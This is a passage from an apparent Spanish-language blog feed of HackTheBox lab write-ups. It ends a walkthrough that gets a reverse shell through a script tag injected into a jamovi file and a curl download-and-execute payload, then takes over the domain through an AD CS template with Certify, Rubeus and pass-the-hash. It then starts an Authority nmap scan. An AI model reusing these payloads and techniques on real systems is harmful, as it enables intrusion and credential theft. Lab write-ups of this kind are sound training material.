    <p>Vamos a editarlo para que nos cargue nuestro propio <code class="language-plaintext highlighter-rouge">.js</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
<span class="o">{</span>
  <span class="s2">"dataSet"</span>: <span class="o">{</span>
    <span class="s2">"rowCount"</span>: 150,
    <span class="s2">"columnCount"</span>: 5,
    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"fields"</span>: <span class="o">[</span>
      <span class="o">{</span>
        <span class="s2">"name"</span>: <span class="s2">"&lt;script src=</span><span class="se">\"</span><span class="s2">http://10.10.14.74/yiyi.js</span><span class="se">\"</span><span class="s2">&gt;&lt;/script&gt;"</span>,
        <span class="s2">"id"</span>: 1,
</code></pre></div></div>

<ul>
  <li>Ahora vamos a comprimir todo otra vez para meterlo en el recurso compartido ya que tenemos privilegios “se fueron algunos archivos que tenia que no tiene nada que ver pero no importa”.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip <span class="nt">-r</span> Whatif.omv <span class="nb">.</span>
updating: META-INF/MANIFEST.MF <span class="o">(</span>deflated 30%<span class="o">)</span>
updating: index.html <span class="o">(</span>deflated 67%<span class="o">)</span>
updating: metadata.json <span class="o">(</span>deflated 78%<span class="o">)</span>
updating: xdata.json <span class="o">(</span>deflated 33%<span class="o">)</span>
updating: data.bin <span class="o">(</span>deflated 84%<span class="o">)</span>
updating: 01 empty/analysis <span class="o">(</span>deflated 8%<span class="o">)</span>
  adding: Tooth Growth.omv <span class="o">(</span>deflated 14%<span class="o">)</span>
  adding: shell.exe <span class="o">(</span>deflated 75%<span class="o">)</span>
  adding: vnp <span class="o">(</span>deflated 5%<span class="o">)</span>
  adding: hash.txt <span class="o">(</span>deflated 62%<span class="o">)</span>
  adding: req.txt <span class="o">(</span>deflated 23%<span class="o">)</span>
  adding: Big 5.omv <span class="o">(</span>deflated 5%<span class="o">)</span>
  adding: 01 empty/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: chisel_1.9.1_linux_amd64 <span class="o">(</span>deflated 59%<span class="o">)</span>
  adding: chisel.exe <span class="o">(</span>deflated 59%<span class="o">)</span>
  adding: creds.txt <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: Captura.cap <span class="o">(</span>deflated 48%<span class="o">)</span>
  adding: users.txt <span class="o">(</span>deflated 34%<span class="o">)</span>
  adding: Bugs.omv <span class="o">(</span>deflated 10%<span class="o">)</span>
  adding: META-INF/ <span class="o">(</span>stored 0%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a crear el archivo <code class="language-plaintext highlighter-rouge">.js</code> para enviarnos una reverse shell vamos a usar el .exe que ya teníamos con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que lo guarde en la ruta <code class="language-plaintext highlighter-rouge">ProgramData</code> y después lo ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>yiyi.js
require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">'curl 10.10.14.74/shell.exe -o C:\\ProgramData\\shell.exe &amp;&amp; C:\\ProgramData\\shell.exe'</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ejecutamos un servidor http con python3 para que lo descargue.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora metemos el comprimido en la carpeta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbclient windcorp.htb/localadmin:Secret123@earth.windcorp.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Shared</span>
<span class="c"># cd Documents\Analytics</span>
<span class="c"># put Whatif.omv</span>
</code></pre></div></div>

<ul>
  <li>Y nos ponemos en escucha para esperar que se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Una vez ejecutado todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /yiyi.js HTTP/1.1"</span> 200 -
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 50589
Windows PowerShell running as user diegocruz on EARTH
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.


PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>windcorp<span class="se">\d</span>iegocruz
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>iegocruz<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
604f02b0879f8657d4e73b20efb04851
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios-and-root-flag">Escalada de privilegios and root flag</h2>

<ul>
  <li>
    <p>Si recordamos en los recursos compartidos de SMB encontramos una recurso llamado <code class="language-plaintext highlighter-rouge">CertEnroll</code> que funciona para el despliegue de certificados.</p>
  </li>
  <li>
    <p>Podemos usar Certify.exe para buscar <code class="language-plaintext highlighter-rouge">templates</code> vulnerables como ya lo hemos hecho en otras máquinas <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\C</span>ertify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user'</span>s unrolled group SIDs <span class="k">for </span>vulnerability checks.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=windcorp,DC=htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'windcorp-CA'</span>

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>windcorp-CA, <span class="nv">DC</span><span class="o">=</span>windcorp, <span class="nv">DC</span><span class="o">=</span>htb
    Cert Thumbprint               : 3C0BAA04CCB852BB7703BB662CEF4A1FB9B54A39
    Cert Serial                   : 7DF2D3B3A1A4B8B5484E459E1D5CA15D
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 1/5/2124 6:40:41 PM
    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>windcorp-CA,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
    Enrollment Agent Restrictions : None

<span class="o">[</span>+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290



Certify completed <span class="k">in </span>00:00:12.5821066
</code></pre></div></div>

<ul>
  <li>Vamos a explotar el Template <code class="language-plaintext highlighter-rouge">Web</code> tiene el grupo <code class="language-plaintext highlighter-rouge">WINDCORP\webdevelopers</code> asignado como <code class="language-plaintext highlighter-rouge">Owner</code> y nuestro usuario pertenece a ese grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; net user diegocruz
User name                    DiegoCruz
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 6:42:38 PM
Password expires             Never
Password changeable          5/27/2021 6:42:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/14/2024 8:51:41 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *webdevelopers
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar el siguiente script en powershell para explotarlo <a href="https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1">https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1</a>.</p>
  </li>
  <li>
    <p>El problema de esta máquina es sus UPN (User Principal Name) están mal estos se usan para identificar a un usuario en un dominio casi siempre es <code class="language-plaintext highlighter-rouge">nombre@dominio</code> nuestro usuario tiene <code class="language-plaintext highlighter-rouge">.thm</code> esto puedo causar problemas y en el .ps1 es donde se esta usando.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.userprincipalname
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> UserPrincipalName
PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.UserPrincipalName
Diego.Cruz@windcorp.thm
</code></pre></div></div>

<ul>
  <li>Lo que vamos hacer es cambiar la línea de código para que se identifique con el <code class="language-plaintext highlighter-rouge">samaccountname</code> que no tiene .thm para no obtener errores.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> SamAccountName
PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.SamAccountName
DiegoCruz
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ADCS.ps1 | <span class="nb">grep </span>samaccountname
    <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.samaccountname
</code></pre></div></div>

<ul>
  <li>Ahora vamos a moverlo a la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/ADCS.ps1 <span class="nt">-o</span> ADCS.ps1
</code></pre></div></div>

<ul>
  <li>También vamos a necesitar <code class="language-plaintext highlighter-rouge">PowerView</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/PowerView.ps1 <span class="nt">-o</span> PowerView.ps1
</code></pre></div></div>

<ul>
  <li>Ahora importarnos los módulos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\P</span>owerView.ps1
PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\A</span>DCS.ps1
</code></pre></div></div>

<ul>
  <li>Ahora vamos por el certificado pasándole el nombre del template y el usuario que queremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Get-SmartCardCertificate <span class="nt">-Identity</span> Administrator <span class="nt">-TemplateName</span> Web <span class="nt">-NoSmartCard</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nb">dir </span>Cert:<span class="se">\C</span>urrentUser<span class="se">\M</span>y


   PSParentPath: Microsoft.PowerShell.Security<span class="se">\C</span>ertificate::CurrentUser<span class="se">\M</span>y

Thumbprint                                Subject
<span class="nt">----------</span>                                <span class="nt">-------</span>
F1D2CE4A7727B4A4ED1414302EE5E887063838FB
</code></pre></div></div>

<ul>
  <li>Ahora usamos Rubeus para obtener el hash<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:F1D2CE4A7727B4A4ED1414302EE5E887063838FB /getcredentials

   ______        _
  <span class="o">(</span>_____ <span class="se">\ </span>     | |
   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/

  v2.2.0

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'windcorp.htb\Administrator'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::95fd:7c69:ca2c:4d61%10:88
<span class="o">[</span>+] TGT request successful!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:

      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
      <span class="nv">MTc0NFqoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI</span><span class="o">=</span>

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  7/14/2024 11:17:44 PM
  EndTime                  :  7/15/2024 9:17:44 AM
  RenewTill                :  7/21/2024 11:17:44 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64<span class="o">(</span>key<span class="o">)</span>              :  <span class="nv">ilnUan6u3cm7e372x044og</span><span class="o">==</span>
  ASREP <span class="o">(</span>key<span class="o">)</span>              :  2778BBEAF9B6991B0EFAD85F81EBA582

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
PS C:<span class="se">\P</span>rogramData&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 3CCC18280610C6CA3156F995B5899E09
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\A</span>dministrator:3CCC18280610C6CA3156F995B5899E09 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos conectarnos y ver la root flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec windcorp.htb/Administrator@earth.windcorp.htb <span class="nt">-hashes</span> :3CCC18280610C6CA3156F995B5899E09
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file aLLnjNcY.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Efnp on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Efnp.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2114]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
8a4cae54d70626a3512d970aeecd52b6

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Authority (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" rel="alternate" type="text/html" title="HackTheBox - Authority (medium)" /><published>2024-07-10T00:00:00-06:00</published><updated>2024-07-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png" />
</p>

<ul>
  <li>Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49692,49693,49699,49700,49716,59430 10.10.11.222 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-10 17:03 CST
Nmap scan report <span class="k">for </span>10.10.11.222
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-11 03:03:43Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
| ssl-cert: Subject:
